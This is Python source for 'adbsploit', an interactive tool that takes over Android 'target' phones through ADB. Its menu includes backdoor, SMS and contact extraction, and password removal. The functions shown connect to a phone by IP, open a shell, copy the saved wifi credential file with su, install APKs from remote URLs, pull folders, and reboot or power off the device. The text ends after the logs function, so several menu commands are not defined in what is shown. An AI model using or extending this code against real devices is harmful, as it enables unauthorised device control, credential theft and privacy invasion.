import os
import shutil
import subprocess
import sys
import random

import adbutils
from colorama import Fore
from pyfiglet import Figlet
from rich.console import Console
from rich.table import Table

arrow = Fore.RED + " └──>" + Fore.WHITE
device = 'none'


def main():
    command = input(Fore.WHITE + "adbsploit" + Fore.RED + "(" + device + ")" + Fore.WHITE + " > ")
    if command == 'help':
        help()
        main()
    elif command == 'devices':
        devices()
        main()
    elif command == 'select':
        select()
        main()
    elif command == 'connect':
        connect()
        main()
    elif command == 'list-forward':
        list_forward()
        main()
    elif command == 'forward':
        forward()
        main()
    elif command == 'wifi':
        wifi()
        main()
    elif command == 'airplane':
        airplane()
        main()
    elif command == 'dumpsys':
        dumpsys()
        main()
    elif command == 'list-apps':
        list_apps()
        main()
    elif command == 'wpa-supplicant':
        wpa_supplicant()
        main()
    elif command == 'start-app':
        start_app()
        main()
    elif command == 'stop-app':
        stop_app()
        main()
    elif command == 'clear-app':
        clear_app()
        main()
    elif command == 'install':
        install()
        main()
    elif command == 'install-remote':
        install_remote()
        main()
    elif command == 'uninstall':
        uninstall()
        main()
    elif command == 'shell':
        shell()
        main()
    elif command == 'shutdown':
        shutdown()
        main()
    elif command == 'reboot':
        reboot()
        main()
    elif command == 'kill-server':
        kill_server()
        main()
    elif command == 'get-folder':
        get_folder()
        main()
    elif command == 'logs':
        logs()
        main()
    elif command == 'show_ip':
        show_ip()
        main()
    elif command == 'battery':
        battery()
        main()
    elif command == 'appinfo':
        appinfo()
        main()
    elif command == 'netstat':
        netstat()
        main()
    elif command == 'sound':
        sound()
        main()
    elif command == 'check-screen':
        check_screen()
        main()
    elif command == 'dump-hierarchy':
        dump_hierarchy()
        main()
    elif command == 'keyevent':
        keyevent()
        main()
    elif command == 'show-keyevents':
        show_keyevents()
        main()
    elif command == 'open-browser':
        open_browser()
        main()
    elif command == 'remove-password':
        remove_password()
        main()
    elif command == 'swipe':
        swipe()
        main()
    elif command == 'screen':
        screen()
        main()
    elif command == 'unlock-screen':
        unlock_screen()
        main()
    elif command == 'lock-screen':
        lock_screen()
        main()
    elif command == 'show-mac':
        show_macaddress()
        main()
    elif command == 'screenshot':
        screenshot()
        main()
    elif command == 'dump-meminfo':
        dump_meminfo()
        main()
    elif command == 'process-list':
        process_list()
        main()
    elif command == 'tcpip':
        tcpip()
        main()
    elif command == 'current-app':
        current_app()
        main()
    elif command == 'extract-contacts':
        extract_contacts()
        main()
    elif command == 'extract-sms':
        extract_sms()
        main()
    elif command == 'delete-sms':
        delete_sms()
        main()
    elif command == 'send-sms':
        send_sms()
        main()
    elif command == 'extract-app':
        extract_app()
        main()
    elif command == 'recovery-mode':
        recovery_mode()
        main()
    elif command == 'device-info':
        device_info()
        main()
    elif command == 'fastboot-mode':
        fastboot_mode()
        main()
    elif command == 'kill-process':
        kill_process()
        main()
    elif command == 'screenrecord':
        screenrecord()
        main()
    elif command == 'remote-control':
        remote_control()
        main()
    elif command == 'backdoor':
        backdoor()
        main()
    elif command == 'clear':
        clear()
        main()
    elif command == 'version':
        version()
        main()
    elif command == 'exit':
        exit()
    else:
        print(arrow + Fore.RED + " That command doesn't exists...")
        main()


# *******************************************************************************
# Functions

# show connected devices
def devices():
    table = Table()
    table.add_column("Device detected", style="cyan")
    table.add_column("Model", style="magenta")
    table.add_column("Name", style="magenta")
    table.add_column("Device", style="magenta")
    for d in adbutils.adb.device_list():
        table.add_row(d.serial, d.prop.model, d.prop.name, d.prop.device)
    console = Console()
    console.print(table)

# function for connecting to the target phone
def connect():
    print(("[{0}+{1}] Enter the phone IP address to connect").format(Fore.RED, Fore.WHITE))
    dev = input(arrow + " adbsploit" + Fore.RED + "(connect) " + Fore.WHITE + "> ")
    output = adbutils.adb.connect(dev)
    print(arrow + Fore.GREEN + " * " + output)

# select phone
def select():
    print(("[{0}+{1}] Enter the phone serial").format(Fore.RED, Fore.WHITE))
    dev = input(arrow + " adbsploit" + Fore.RED + "(select) " + Fore.WHITE + "> ")
    output = adbutils.adb.device(serial=dev)
    global device
    try:
        output.is_screen_on()
        print("Selected device: " + Fore.GREEN + output.serial)
        device = output.serial
        main()
    except:
        print(arrow + ("[{0}+{1}] That device doesn't exist...").format(Fore.RED, Fore.WHITE))

# lists
def list_forward():
    global device
    table = Table()
    table.add_column("Device", style="cyan")
    table.add_column("Local Port", style="magenta")
    table.add_column("Remote Port", style="magenta")
    if device != 'none':
        # list only one device forwards
        for item in adbutils.adb.forward_list(device):
            table.add_row(item.serial, item.local, item.remote)
        console = Console()
        console.print(table)
    else:
        # list all forwards
        for item in adbutils.adb.forward_list():
            table.add_row(item.serial, item.local, item.remote)
        console = Console()
        console.print(table)

# port forward
def forward():
    global device
    if device != 'none':
        print(("[{0}+{1}] Enter the local port to foward").format(Fore.RED, Fore.WHITE))
        local = input(arrow + " adbsploit" + Fore.RED + "(forward) " + Fore.WHITE + "> ")
        print(("[{0}+{1}] Enter the remote port to forward").format(Fore.RED, Fore.WHITE))
        remote = input(arrow + " adbsploit" + Fore.RED + "(forward) " + Fore.WHITE + "> ")
        d = adbutils.adb.device(device)
        output = d.forward(local, remote)
        print(output)
        print(Fore.GREEN + "The port forward is now active...")
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# show the wifi near the target device
def wifi():
    global device
    if device != 'none':
        d = adbutils.adb.device(device)
        print(("[{0}+{1}] Enter the state of the wifi (ON/OFF)").format(Fore.RED, Fore.WHITE))
        state = input(arrow + " adbsploit" + Fore.RED + "(wifi) " + Fore.WHITE + "> ")
        if state == 'on' or state == 'ON':
            d.shell('svc wifi enable')
            print(arrow + Fore.GREEN + 'The wifi is now enabled on the device')
        elif state == 'off' or state == 'OFF':
            d.shell('svc wifi disable')
            print(
                arrow + Fore.GREEN + 'The wifi is now disabled on the device. To turn it on again you must plugged in')
        else:
            print(arrow + ("[{0}+{1}] That state doesn't exists").format(Fore.RED, Fore.WHITE))
            wifi()
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# dump sys info
def dumpsys():
    global device
    if device != 'none':
        d = adbutils.adb.device(device)
        print(arrow + d.shell(device + ' dumpsys'))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# list all apps
def list_apps():
    global device
    if device != 'none':
        d = adbutils.adb.device(device)
        apps = d.list_packages()
        table = Table()
        table.add_column("App", style="cyan")
        for a in apps:
            table.add_row(a)
        console = Console()
        console.print(table)
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# wpa shows
def wpa_supplicant():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            d.shell("su -c 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/'")
            d.sync.pull("/sdcard/wpa_supplicant.conf", "wpa_supplicant.conf")
            # d.shell(device + " pull /sdcard/wpa_supplicant.conf "+location)
            print(arrow + Fore.GREEN + 'WPA Supplicant exported correctly')
        except:
            print(arrow + Fore.RED + 'An error has been occurred grabbing the wpa_supplicant')
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# install apk in the target phone
def install():
    global device
    if device != 'none':
        try:
            print(("[{0}+{1}] Enter the apk path").format(Fore.RED, Fore.WHITE))
            apk = input(arrow + " adbsploit" + Fore.RED + "(install) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            d.install(apk)
            print(arrow + Fore.GREEN + 'APK installed successfully')
        except:
            print(
                arrow + Fore.RED + 'An error has been occurred installing the APK. Check the path or the error related')
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# install from a remote serer 
def install_remote():
    global device
    if device != 'none':
        try:
            print(("[{0}+{1}] Enter the apk URL").format(Fore.RED, Fore.WHITE))
            url = input(arrow + " adbsploit" + Fore.RED + "(install_remote) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            d.install_remote(url)
            print(arrow + Fore.GREEN + 'APK installed successfully')
        except:
            print(
                arrow + Fore.RED + 'An error has been occurred installing the APK. Check the path or the error related')
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# uninstall apps from the target phone
def uninstall():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] Enter the package name").format(Fore.RED, Fore.WHITE))
            app = input(arrow + " adbsploit" + Fore.RED + "(uninstall) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            d.uninstall(app)
            print(arrow + Fore.GREEN + 'APK uninstalled successfully')
        except:
            print(
                arrow + Fore.RED + 'An error has been occurred uninstalling the APK. Check the package name or the error related')
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# spawn a shell
def shell():
    global device
    if device != 'none':
        try:
            os.system("adb -s " + device + " shell")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred opening the shell...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# shut down target phone 
def shutdown():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            d.shell('reboot -p')
            print(arrow + Fore.GREEN + 'The device is shutting down...')
        except:
            print(arrow + ("[{0}+{1}] An error ocurred shutting down the device").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# reboot the target phone
def reboot():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            d.shell('reboot')
            print(arrow + Fore.GREEN + 'The device is rebooting...')
        except:
            print(arrow + ("[{0}+{1}] An error ocurred opening the shell...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# kill server
def kill_server():
    try:
        adbutils.adb.server_kill()
        print(arrow + Fore.GREEN + 'The server is down...')
    except:
        print(arrow + ("[{0}+{1}] An error ocurred killing the server...").format(Fore.RED, Fore.WHITE))

# get folders in the target device
def get_folder():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] Enter the path of the folder to pull").format(Fore.RED, Fore.WHITE))
            path = input(arrow + " adbsploit" + Fore.RED + "(get_folder) " + Fore.WHITE + "> ")
            print(arrow + ("[{0}+{1}] Enter the path of the destination").format(Fore.RED, Fore.WHITE))
            name = input(arrow + " adbsploit" + Fore.RED + "(get_folder) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            d.sync.pull(path, name)
        except:
            print(arrow + ("[{0}+{1}] An error ocurred pulling the folder...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# get phone logs
def logs():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] You want all the logs or only an app? (all/package_name) ").format(Fore.RED,
                                                                                                         Fore.WHITE))
            app = input(arrow + " adbsploit" + Fore.RED + "(logs) " + Fore.WHITE + "> ")
            if app == "all":
                os.system('adb -s ' + device + " logcat ")
            else:
                os.system('adb -s ' + device + " logcat " + "app")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred getting the logs...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))